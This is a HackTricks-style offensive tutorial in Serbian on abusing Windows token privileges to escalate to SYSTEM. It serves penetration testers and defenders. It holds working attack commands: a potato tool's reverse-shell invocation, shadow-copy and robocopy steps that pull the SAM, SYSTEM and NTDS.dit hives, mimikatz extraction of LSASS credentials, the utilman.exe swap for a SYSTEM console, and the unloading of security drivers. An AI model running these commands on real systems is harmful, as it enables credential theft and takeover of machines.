# Zloupotreba tokena

{{#include ../../banners/hacktricks-training.md}}

## Tokeni

Ako **ne znaš šta su Windows Access Tokens** pročitaj ovu stranicu pre nego što nastaviš:


{{#ref}}
access-tokens.md
{{#endref}}

**Možda možeš da eskaliraš privilegije zloupotrebljavajući tokene koje već imaš**

### SeImpersonatePrivilege

Ovo je privilegija koju ima svaki proces i omogućava impersonation (ali ne i kreiranje) bilo kog tokena, pod uslovom da se do njega može doći putem handle-a. Privilegovani token može se dobiti od Windows servisa (DCOM) tako što se navede da izvrši NTLM autentifikaciju prema exploit-u, čime se zatim omogućava izvršavanje procesa sa SYSTEM privilegijama. Ova ranjivost može da se iskoristi pomoću različitih alata, kao što su [juicy-potato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (koji zahteva da je winrm onemogućen), [SweetPotato](https://github.com/CCob/SweetPotato) i [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

Napomene za moderne operatore:

- **JuicyPotato je legacy**: na Windows 10 1809+/Server 2019+, koristi **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato** ili **PrintSpoofer**, u zavisnosti od toga koja RPC/COM površina je još uvek dostupna.
- Ako si kompromitovao servis koji radi kao **`LOCAL SERVICE`** ili **`NETWORK SERVICE`** i `whoami /priv` pokazuje **filtered token** bez `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege`, prvo vrati **default privilege set** naloga (na primer pomoću **FullPowers**) i zatim ponovo probaj potato family.
- Neki noviji fork-ovi su pogodniji za operatere od originalnih alata. Na primer, **SigmaPotato** dodaje reflection/in-memory execution i modernu Windows kompatibilnost, dok **PrintNotifyPotato** zloupotrebljava PrintNotify COM servis i često je koristan kada je klasična Spooler putanja onemogućena.
```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

Veoma je slično **SeImpersonatePrivilege**, koristiće **isti metod** da dobije privilegovani token.\
Zatim, ova privilegija omogućava **dodeljivanje primarnog tokena** novom/suspendovanom procesu. Sa privilegovanim impersonation tokenom možete derivirati primarni token (DuplicateTokenEx).\
Sa tokenom, možete kreirati **novi proces** pomoću 'CreateProcessAsUser' ili kreirati proces u suspendovanom stanju i **postaviti token** (uopšteno, ne možete menjati primarni token procesa koji je već u radu).

### SeTcbPrivilege

Ako imate omogućen ovaj token, možete koristiti **KERB_S4U_LOGON** da dobijete **impersonation token** za bilo kog drugog korisnika bez poznavanja kredencijala, **dodate proizvoljnu grupu** (admins) u token, postavite **integrity level** tokena na "**medium**", i dodelite ovaj token **trenutnoj niti** (SetThreadToken).

### SeBackupPrivilege

Ova privilegija navodi sistem da **odobri sav read access** za bilo koji fajl (ograničeno na read operacije). Koristi se za **čitanje password hashes lokalnih Administrator** naloga iz registra, nakon čega se alati poput "**psexec**" ili "**wmiexec**" mogu koristiti sa hashom (Pass-the-Hash tehnika). Međutim, ova tehnika ne uspeva u dva slučaja: kada je Local Administrator nalog onemogućen, ili kada postoji politika koja uklanja administrativna prava sa Local Administrators koji se povezuju udaljeno.\
U praksi, najpouzdaniji ugrađeni workflow je obično **VSS + `robocopy /b`**: kreirajte/izložite shadow copy, zatim kopirajte `SAM`/`SYSTEM` ili `NTDS.dit` u **backup mode**, što zaobilazi file ACLs.
```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```
Možete **abuse this privilege** sa:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- prateći **IppSec** u [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
- Ili kao što je objašnjeno u odeljku **escalating privileges with Backup Operators** u:

{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

Ova privilegija daje dozvolu za **write access** nad bilo kojom sistemskom datotekom, bez obzira na datotetni Access Control List (ACL). Otvara brojne mogućnosti za escalation, uključujući mogućnost da se **modify services**, izvrši DLL Hijacking, i postave **debuggers** preko Image File Execution Options, kao i druge tehnike.

### SeCreateTokenPrivilege

SeCreateTokenPrivilege je moćna dozvola, posebno korisna kada korisnik ima mogućnost da impersonate tokens, ali i kada nema SeImpersonatePrivilege. Ova mogućnost zavisi od sposobnosti da se impersonate token koji predstavlja istog korisnika i čiji integrity level ne prelazi integrity level trenutnog procesa.

**Key Points:**

- **Impersonation without SeImpersonatePrivilege:** Moguće je iskoristiti SeCreateTokenPrivilege za EoP impersonating tokena pod određenim uslovima.
- **Conditions for Token Impersonation:** Uspešna impersonation zahteva da target token pripada istom korisniku i da ima integrity level koji je manji ili jednak integrity level-u procesa koji pokušava impersonation.
- **Creation and Modification of Impersonation Tokens:** Korisnici mogu da kreiraju impersonation token i da ga unaprede dodavanjem SID-a (Security Identifier) privilegovane grupe.

### SeLoadDriverPrivilege

Ova privilegija omogućava da se **load and unload device drivers** uz kreiranje registry entry-ja sa specifičnim vrednostima za `ImagePath` i `Type`. Pošto je direktan write access na `HKLM` (HKEY_LOCAL_MACHINE) ograničen, umesto toga mora da se koristi `HKCU` (HKEY_CURRENT_USER). Međutim, da bi kernel prepoznao `HKCU` za konfiguraciju drivera, mora da se prati određena putanja.

Modern offensive use je obično **BYOVD** (bring your own vulnerable driver): učitati **signed but vulnerable** kernel driver i zatim koristiti njegove IOCTL-e da se onemoguće zaštite ili pređe na kernel code execution. Imajte na umu da na novijim Windows 11/Server buildovima **Microsoft vulnerable driver blocklist** i/ili **HVCI/Memory Integrity** često lome starije javne chains, pa klasični primeri tipa `szkg64.sys` više nisu univerzalno pouzdani.

Ova putanja je `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, gde je `<RID>` Relative Identifier trenutnog korisnika. Unutar `HKCU`, ovu celu putanju treba kreirati, i potrebno je postaviti dve vrednosti:

- `ImagePath`, koja je putanja do binarne datoteke koja će se izvršiti
- `Type`, sa vrednošću `SERVICE_KERNEL_DRIVER` (`0x00000001`).

**Steps to Follow:**

1. Pristupite `HKCU` umesto `HKLM` zbog ograničenog write access-a.
2. Kreirajte putanju `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` unutar `HKCU`, gde `<RID>` predstavlja Relative Identifier trenutnog korisnika.
3. Postavite `ImagePath` na putanju izvršavanja binarne datoteke.
4. Dodelite `Type` kao `SERVICE_KERNEL_DRIVER` (`0x00000001`).
```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```
Još načina da se zloupotrebi ova privilegija su u [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

Ovo je slično kao **SeRestorePrivilege**. Njena primarna funkcija omogućava procesu da **preuzme vlasništvo nad objektom**, zaobilazeći zahtev za eksplicitnim discretionary access kroz dodelu WRITE_OWNER access rights. Proces podrazumeva prvo obezbeđivanje vlasništva nad željenim registry key za potrebe pisanja, a zatim izmenu DACL da bi se omogućile write operations.
```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```
### SeDebugPrivilege

Ova privilegija dozvoljava da **debug other processes**, uključujući čitanje i upis u memoriju. Različite strategije za memory injection, koje mogu da zaobiđu većinu antivirus i host intrusion prevention rešenja, mogu se koristiti sa ovom privilegijom.

Na modernom Windows-u, zapamti da je `SeDebugPrivilege` obično dovoljno da se otvore **non-protected SYSTEM processes** i dupliraju njihovi tokeni, ali to **nije** garancija da možeš da pristupiš **LSASS**. Ako je **RunAsPPL / LSA Protection** omogućen, non-protected processes ne mogu da čitaju ili injektuju u LSASS čak i ako je `SeDebugPrivilege` prisutan. U tom slučaju, ukradi token iz drugog non-PPL SYSTEM procesa, ili chain-uj sa PPL bypass/BYOVD umesto da pretpostavljaš da će `procdump` raditi. Za kompletan primer kopiranja tokena koristeći `SeDebugPrivilege` + `SeImpersonatePrivilege`, pogledaj [this page](sedebug-+-seimpersonate-copy-token.md).

#### Dump memory

Možeš da koristiš [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) iz [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) da **capture the memory of a process**. Konkretno, to može da se primeni na **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)** proces, koji je odgovoran za čuvanje korisničkih kredencijala nakon što se korisnik uspešno prijavi na sistem.

Zatim možeš da učitaš ovaj dump u mimikatz da bi dobio lozinke:
```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
#### RCE

Ako želite da dobijete `NT SYSTEM` shell možete koristiti:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)
```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```
### SeManageVolumePrivilege

Ovo pravo (Perform volume maintenance tasks) omogućava otvaranje raw volume device handle-ova (npr., \\.\C:) za direktan disk I/O koji zaobilazi NTFS ACLs. Sa njim možete kopirati bajtove bilo kog fajla na volume-u čitajući osnovne blokove, što omogućava arbitrary file read osetljivog materijala (npr., machine private keys u %ProgramData%\Microsoft\Crypto\, registry hives, SAM/NTDS via VSS). Posebno je značajno na CA serverima gde exfiltrating CA private key omogućava pravljenje Golden Certificate za impersonate bilo kog principal-a.

Pogledajte detaljne tehnike i mitigations:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{#endref}}

## Check privileges
```
whoami /priv
```
**Tokeni koji se pojavljuju kao Disabled** obično mogu biti enabled, pa često možete abuse i _Enabled_ i _Disabled_ privilegije.

### Enable All the tokens

Ako imate disabled privilegije, možete koristiti skriptu [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) da enable-ujete sve tokene:
```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```
Ili **script** ugrađen u ovom [**postu**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/).

## Tabela

Kompletan token privileges cheatsheet je na [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin), a sažetak ispod će navesti samo direktne načine da se privilege iskoristi za dobijanje admin sesije ili čitanje osetljivih fajlova.

| Privilege                  | Impact      | Tool                    | Execution path                                                                                                                                                                                                                                                                                                                                     | Remarks                                                                                                                                                                                                                                                                                                                        |
| ------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | 3rd party tool          | _"It would allow a user to impersonate tokens and privesc to nt system using tools such as potato.exe, rottenpotato.exe and juicypotato.exe"_                                                                                                                                                                                                      | Hvala [Aurélien Chalot](https://twitter.com/Defte_) na ažuriranju. Pokušaću uskoro da to preformulišem u nešto više nalik receptu.                                                                                                                                                                                         |
| **`SeBackup`**             | **Threat**  | _**Built-in commands**_ | Čitaj osetljive fajlove pomoću `robocopy /b` ili posebnih copy helpera koji podržavaju SeBackup.                                                                                                                                                                                                                                                                 | <p>- Odlično za `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit`, a ponekad i `%WINDIR%\MEMORY.DMP`.<br><br>- `robocopy` je praktičan, ali posebni SeBackup cmdlet-i/API-ji su često fleksibilniji za zaključane/otvorene fajlove.</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | 3rd party tool          | Kreiraj proizvoljan token, uključujući lokalna admin prava, sa `NtCreateToken`.                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | Dupliraj **non-PPL** SYSTEM token ili izvuci memoriju iz procesa koji nije zaštićen.                                                                                                                                                                                                                                                                 | <p>LSASS dumping je često blokiran ako je uključeno RunAsPPL/LSA Protection.</p><p>Script se nalazi na [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | 3rd party tool          | Koristi **Potato family** / named-pipe impersonation da pokreneš SYSTEM (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato`, itd.).                                                                                                                                                                                    | <p>Najpraktičnije iz service account-ova kao što su IIS APPPOOL, MSSQL, scheduled tasks, ili bilo kog konteksta koji već poseduje `SeImpersonatePrivilege`.</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | 3rd party tool          | <p>1. Učitaj potpisan, ali ranjiv kernel driver (BYOVD)<br>2. Iskoristi driver IOCTL-ove da dobiješ kernel R/W, isključiš security tooling, ili podigneš privilegije na SYSTEM<br><br>Alternativno, privilege se može koristiti za unloadovanje security-related driver-a pomoću ugrađene komande <code>fltMC</code>, tj. <code>fltMC sysmondrv</code></p>                     | <p>Stariji javni driver-i kao što je <code>szkg64.sys</code> se sve češće blokiraju na modernom Windows-u zbog vulnerable-driver blocklist / HVCI.</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. Pokreni PowerShell/ISE sa prisutnim SeRestore privilege.<br>2. Omogući privilege sa <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>).<br>3. Preimenuj utilman.exe u utilman.old<br>4. Preimenuj cmd.exe u utilman.exe<br>5. Zaključaj konzolu i pritisni Win+U</p> | <p>Napad može biti detektovan od strane nekog AV softvera.</p><p>Alternativna metoda se oslanja na zamenu service binary-ja koji su skladišteni u "Program Files" koristeći isti privilege</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Built-in commands**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. Preimenuj cmd.exe u utilman.exe<br>4. Zaključaj konzolu i pritisni Win+U</p>                                                                                                                                       | <p>Napad može biti detektovan od strane nekog AV softvera.</p><p>Alternativna metoda se oslanja na zamenu service binary-ja koji su skladišteni u "Program Files" koristeći isti privilege.</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | 3rd party tool          | <p>Manipuliši tokenima tako da uključuju lokalna admin prava. Može zahtevati SeImpersonate.</p><p>Za proveru.</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## Reference

- Pogledaj ovu tabelu koja definiše Windows tokens: [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin)
- Pogledaj [**ovaj paper**](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt) o privesc sa tokenima.
- itm4n – Give Me Back My Privileges! Please? (restricted service tokens / FullPowers): https://itm4n.github.io/localservice-privileges/
- Microsoft – Robocopy (`/b` backup mode bypasses file/folder ACL checks): https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy
- Microsoft – Perform volume maintenance tasks (SeManageVolumePrivilege): https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks
- 0xdf – HTB: Certificate (SeManageVolumePrivilege → CA key exfil → Golden Certificate): https://0xdf.gitlab.io/2025/10/04/htb-certificate.html

{{#include ../../banners/hacktricks-training.md}}
